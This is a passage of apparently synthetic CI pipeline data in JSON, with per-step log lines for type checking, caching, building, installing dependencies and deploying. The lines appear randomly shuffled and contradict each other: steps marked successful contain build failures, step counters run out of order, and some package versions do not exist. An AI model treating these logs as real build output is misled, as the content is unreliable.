        "log_lines": [
          "=== Step: type_check ===",
          "\u2713 test completed",
          "\u2717 build failed with exit code 45",
          "Step 3/10: Building",
          "Installing eslint@1.12.0",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_db_connect (58ms)",
          "Exception: ValueError",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:24] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "[12:00:24] WARN: Deprecated API usage",
          "Cache hit for key-4576",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (167ms)",
          "Compiling src/utils.go...",
          "Installing eslint@5.5.0",
          "  PASS: test_user_create (21ms)",
          "[12:00:24] INFO: Processing request",
          "FAILED: test_cache_hit",
          "Step 5/10: Building",
          "Installing prettier@3.10.0",
          "Step 3/10: Building",
          "Cache hit for key-9987",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing express@1.14.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing jest@3.9.0",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-9789",
          "Compiling src/handler.rs...",
          "Installing axios@3.15.0",
          "  PASS: test_api_health (453ms)",
          "Compiling src/service.java...",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing lodash@4.17.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-7402",
          "Artifact uploaded: build.tar.gz (3MB)",
          "  PASS: test_api_health (128ms)",
          "Step 7/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "Cache hit for key-9778",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-9022",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u2713 build completed",
          "\u2713 build completed",
          "Cache hit for key-1739",
          "Cache hit for key-9347",
          "Cache hit for key-7175",
          "Cache hit for key-4881",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_api_health (165ms)",
          "Exception: TypeError",
          "[12:00:24] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/utils.go...",
          "Installing jest@5.5.0",
          "  PASS: test_db_connect (218ms)",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_auth_login (167ms)",
          "Compiling src/utils.go...",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:24] INFO: Processing request",
          "Installing lodash@4.14.0",
          "  PASS: test_db_connect (269ms)",
          "\u2713 test completed",
          "[12:00:24] WARN: Deprecated API usage",
          "Cache hit for key-6022",
          "Cache hit for key-3005",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing jest@4.10.0",
          "  PASS: test_db_connect (82ms)",
          "WARNING: lodash has known vulnerabilities",
          "Installing prettier@1.17.0",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "Step 9/10: Building",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_auth_login (321ms)",
          "Cache hit for key-2511",
          "[12:00:24] INFO: Processing request",
          "Installing react@3.7.0",
          "Compiling src/handler.rs...",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 2/10: Building",
          "  PASS: test_api_health (375ms)",
          "  PASS: test_db_connect (155ms)",
          "Cache hit for key-5054",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:24] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-2270",
          "FAILED: test_db_connect",
          "Compiling src/index.js...",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (167ms)",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 build completed",
          "Installing lodash@1.8.0",
          "Cache hit for key-5021",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "[12:00:24] INFO: Processing request",
          "Installing react@3.20.0",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_auth_login (237ms)",
          "  PASS: test_auth_login (241ms)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Cache hit for key-6740",
          "[12:00:24] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (230ms)",
          "WARNING: jest has known vulnerabilities",
          "Installing axios@4.9.0",
          "Step 4/10: Building",
          "Installing webpack@5.2.0",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (183ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-9628",
          "Cache hit for key-5314",
          "Installing express@5.3.0",
          "Cache hit for key-7768",
          "Installing webpack@2.14.0",
          "[12:00:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing prettier@3.8.0",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-05T12:00:59.255992",
        "finished_at": "2025-12-05T12:01:04.498184",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Compiling src/utils.go...",
          "Step 6/10: Building",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (256ms)",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Step 9/10: Building",
          "Cache hit for key-9439",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 build completed",
          "Installing express@1.7.0",
          "[12:00:24] ERROR: Connection failed",
          "Cache hit for key-9560",
          "Installing lodash@1.17.0",
          "[12:00:24] ERROR: Connection failed",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Cache hit for key-7827",
          "Installing express@4.13.0",
          "  PASS: test_api_health (353ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: test_api_health (400ms)",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (166ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-6493",
          "Cache hit for key-4142",
          "Step 7/10: Building",
          "Installing eslint@5.13.0",
          "Installing express@2.17.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (139ms)",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-2865",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_auth_login (469ms)",
          "Step 3/10: Building",
          "Cache hit for key-9096",
          "Step 7/10: Building",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "[12:00:24] INFO: Processing request",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:24] INFO: Processing request",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:24] INFO: Processing request",
          "FAILED: test_auth_login",
          "Cache hit for key-9778",
          "\u2713 build completed",
          "Installing axios@4.6.0",
          "Step 1/10: Building",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 test completed",
          "  PASS: test_auth_login (73ms)",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_user_create (68ms)",
          "  PASS: test_db_connect (379ms)",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_db_connect (39ms)",
          "\u2713 build completed",
          "Installing axios@4.19.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 5/10: Building",
          "  PASS: test_db_connect (278ms)",
          "WARNING: axios has known vulnerabilities",
          "\u2713 build completed",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 112",
          "  PASS: test_cache_hit (447ms)",
          "\u2713 lint completed",
          "Installing jest@2.1.0",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_api_health (145ms)",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-6278",
          "Compiling src/main.py...",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:24] INFO: Processing request",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_db_connect (397ms)",
          "Installing react@4.13.0",
          "Installing lodash@4.14.0",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_db_connect (343ms)",
          "Installing react@5.0.0",
          "  PASS: test_user_create (394ms)",
          "\u2713 build completed",
          "  PASS: test_user_create (98ms)",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 16",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_user_create (147ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-8936",
          "[12:00:24] INFO: Processing request",
          "Installing lodash@5.3.0",
          "  PASS: test_db_connect (381ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 test completed",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_db_connect (182ms)",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_api_health (17ms)",
          "  PASS: test_cache_hit (18ms)",
          "Cache hit for key-6211",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing axios@2.17.0",
          "Compiling src/main.py...",
          "Cache hit for key-9546",
          "Installing axios@5.13.0",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "[12:00:24] WARN: Deprecated API usage",
          "[12:00:24] INFO: Processing request",
          "\u2713 build completed",
          "Installing lodash@4.3.0",
          "Installing webpack@3.14.0",
          "\u2713 test completed",
          "\u2713 test completed",
          "[12:00:24] INFO: Processing request",
          "Installing react@5.4.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing eslint@5.14.0",
          "Installing lodash@4.6.0",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-05T12:01:04.498184",
        "finished_at": "2025-12-05T12:01:09.740376",
        "log_lines": [
          "=== Step: save_cache ===",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_api_health (8ms)",
          "Cache hit for key-3362",
          "[12:00:24] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (246ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing jest@3.18.0",
          "Installing webpack@1.11.0",
          "Step 1/10: Building",
          "\u2717 build failed with exit code 84",
          "Installing lodash@1.7.0",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 build completed",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-2862",
          "Step 9/10: Building",
          "  PASS: test_auth_login (460ms)",
          "[12:00:24] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:24] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Step 2/10: Building",
          "Installing react@2.20.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 5/10: Building",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@1.3.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing webpack@1.12.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing webpack@2.7.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-9717",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Installing express@3.11.0",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-6776",
          "Step 6/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing react@3.19.0",
          "\u2713 build completed",
          "[12:00:24] WARN: Deprecated API usage",
          "  PASS: test_user_create (373ms)",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (234ms)",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "\u2713 build completed",
          "[12:00:24] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_auth_login (252ms)",
          "Step 5/10: Building",
          "[12:00:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "WARNING: eslint has known vulnerabilities",
          "Exception: NullPointerException",
          "\u2713 build completed",
          "Installing react@1.7.0",
          "Installing react@2.14.0",
          "Step 10/10: Building",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (19ms)",
          "Installing express@2.19.0",
          "WARNING: react has known vulnerabilities",
          "Step 9/10: Building",
          "  PASS: test_db_connect (450ms)",
          "Step 9/10: Building",
          "[12:00:24] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing webpack@4.12.0",
          "[12:00:24] ERROR: Connection failed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Installing jest@2.3.0",
          "  PASS: test_auth_login (52ms)",
          "[12:00:24] INFO: Processing request",
          "Installing lodash@5.5.0",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-3976",
          "Cache hit for key-5324",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (55ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 7/10: Building",
          "[12:00:24] INFO: Processing request",
          "Step 10/10: Building",
          "Cache hit for key-4012",
          "Step 8/10: Building",
          "  PASS: test_user_create (150ms)",
          "  PASS: test_user_create (265ms)",
          "Cache hit for key-1290",
          "Cache hit for key-6533",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "Installing eslint@2.3.0",
          "Cache hit for key-5416",
          "\u2713 test completed",
          "Installing react@2.16.0",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-9268",
          "[12:00:24] INFO: Processing request",
          "Installing jest@1.4.0",
          "Compiling src/main.py...",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-6108",
          "Installing webpack@1.0.0",
          "  PASS: test_db_connect (356ms)",
          "  PASS: test_auth_login (19ms)",
          "Installing react@3.10.0",
          "Step 10/10: Building",
          "Step 9/10: Building",
          "Installing prettier@4.13.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:24] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_cache_hit (495ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing react@5.3.0",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (27ms)",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (145ms)",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (233ms)",
          "\u2713 build completed",
          "[12:00:24] WARN: Deprecated API usage",
          "  PASS: test_user_create (25ms)",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (148ms)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-05T12:01:09.740376",
        "finished_at": "2025-12-05T12:01:35.951338",
        "log_lines": [
          "=== Step: build ===",
          "  PASS: test_auth_login (367ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-1208",
          "[12:00:24] WARN: Deprecated API usage",
          "Installing react@3.15.0",
          "Cache hit for key-5649",
          "\u2713 test completed",
          "\u2713 test completed",
          "Installing react@4.6.0",
          "Cache hit for key-8433",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Cache hit for key-7817",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 build completed",
          "Cache hit for key-1569",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2717 build failed with exit code 113",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_db_connect (209ms)",
          "Installing react@1.7.0",
          "  PASS: test_auth_login (30ms)",
          "[12:00:24] ERROR: Connection failed",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@1.5.0",
          "[12:00:24] WARN: Deprecated API usage",
          "\u2713 test completed",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-5827",
          "Cache hit for key-8665",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "  PASS: test_db_connect (254ms)",
          "Compiling src/main.py...",
          "Cache hit for key-8586",
          "Step 1/10: Building",
          "  PASS: test_db_connect (279ms)",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Installing eslint@1.10.0",
          "[12:00:24] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-4975",
          "  PASS: test_auth_login (260ms)",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (288ms)",
          "Cache hit for key-6112",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_db_connect (229ms)",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_cache_hit (187ms)",
          "[12:00:24] INFO: Processing request",
          "Step 2/10: Building",
          "Cache hit for key-9229",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Step 1/10: Building",
          "Exception: ValueError",
          "Step 2/10: Building",
          "  PASS: test_db_connect (25ms)",
          "  PASS: test_user_create (248ms)",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-6506",
          "Step 1/10: Building",
          "Step 5/10: Building",
          "Installing jest@3.7.0",
          "[12:00:24] INFO: Processing request",
          "Installing express@5.15.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing react@4.20.0",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2713 test completed",
          "[12:00:24] WARN: Deprecated API usage",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-2416",
          "Cache hit for key-1627",
          "[12:00:24] ERROR: Connection failed",
          "  PASS: test_api_health (171ms)",
          "Cache hit for key-4925",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_user_create (173ms)",
          "Cache hit for key-5246",
          "  PASS: test_api_health (272ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing express@2.1.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 3/10: Building",
          "Cache hit for key-7120",
          "Compiling src/index.js...",
          "Cache hit for key-4400",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Installing express@4.16.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-5083",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 build completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache hit for key-6263",
          "Installing lodash@4.14.0",
          "[12:00:24] INFO: Processing request",
          "Step 4/10: Building",
          "Cache hit for key-2376",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (408ms)",
          "Exception: ValueError",
          "  PASS: test_db_connect (282ms)",
          "Compiling src/index.js...",
          "[12:00:24] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-2413",
          "Compiling src/index.js...",
          "Installing express@3.14.0",
          "\u2713 test completed",
          "[12:00:24] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "FAILED: test_db_connect",
          "[12:00:24] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Step 6/10: Building",
          "[12:00:24] WARN: Deprecated API usage",
          "Cache hit for key-8601",
          "[12:00:24] INFO: Processing request",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "  PASS: test_api_health (347ms)",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Cache hit for key-3412",
          "Cache hit for key-6225",
          "Step 8/10: Building",
          "Step 6/10: Building",
          "\u2713 build completed",
          "[12:00:24] ERROR: Connection failed",
          "\u2713 test completed",
          "Cache hit for key-5294",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-05T12:01:35.951338",
        "finished_at": "2025-12-05T12:02:02.162300",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "  PASS: test_cache_hit (316ms)",
          "Installing eslint@3.1.0",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 8/10: Building",
          "Cache hit for key-7636",
          "Compiling src/index.js...",
          "Installing webpack@2.8.0",
          "Installing lodash@2.18.0",
          "Installing jest@2.10.0",
          "\u2713 lint completed",
          "Cache hit for key-6665",
          "Compiling src/app.ts...",
          "[12:00:24] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:24] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: test_cache_hit (123ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:24] WARN: Deprecated API usage",
          "  PASS: test_user_create (388ms)",
          "[12:00:24] INFO: Processing request",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_cache_hit (471ms)",
          "\u2713 lint completed",
          "Installing axios@1.5.0",
          "[12:00:24] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Exception: TypeError",
          "Cache hit for key-5081",
          "Step 4/10: Building",
          "Installing axios@5.7.0",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (490ms)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (429ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-4971",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_user_create (4ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-6880",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (283ms)",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_api_health (227ms)",
          "Installing express@2.9.0",
          "[12:00:24] ERROR: Connection failed",
          "[12:00:24] WARN: Deprecated API usage",
          "Step 3/10: Building",
          "Installing express@4.11.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 5/10: Building",
          "Installing eslint@1.19.0",
          "Step 5/10: Building",
          "Cache hit for key-2377",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Step 3/10: Building",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "Installing axios@1.15.0",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing axios@4.10.0",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Installing express@3.13.0",
          "  PASS: test_db_connect (271ms)",
          "  PASS: test_cache_hit (81ms)",
          "\u2717 build failed with exit code 18",
          "[12:00:24] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (71ms)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "[12:00:24] ERROR: Connection failed",
          "\u2713 test completed",
          "Installing webpack@4.14.0",
          "Step 5/10: Building",
          "Installing react@1.0.0",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-3340",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-1485",
          "[12:00:24] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Cache hit for key-5716",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-4791",
          "Cache hit for key-8599",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-5907",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing express@2.3.0",
          "Cache hit for key-8536",
          "Installing webpack@4.19.0",
          "Step 4/10: Building",
          "Step 9/10: Building",
          "Installing express@2.18.0",
          "  PASS: test_api_health (484ms)",
          "\u2713 build completed",
          "Step 1/10: Building",
          "  PASS: test_user_create (390ms)",
          "  PASS: test_user_create (428ms)",
          "[12:00:24] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:24] WARN: Deprecated API usage",
          "[12:00:24] INFO: Processing request",
          "Installing lodash@2.9.0",
          "Installing react@4.1.0",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (387ms)",
          "Cache hit for key-5083",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:24] INFO: Processing request",
          "Exception: ValueError",
          "  PASS: test_cache_hit (242ms)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/handler.rs...",
          "[12:00:24] INFO: Processing request",
          "Installing jest@2.7.0",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_db_connect (490ms)",
          "\u2713 test completed",
          "  PASS: test_db_connect (464ms)",
          "[12:00:24] INFO: Processing request",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing prettier@5.10.0",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-05T12:02:02.162300",
        "finished_at": "2025-12-05T12:02:05.657095",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache hit for key-2320",
          "Step 3/10: Building",
          "Step 7/10: Building",
          "Installing lodash@5.9.0",
          "Cache hit for key-6177",
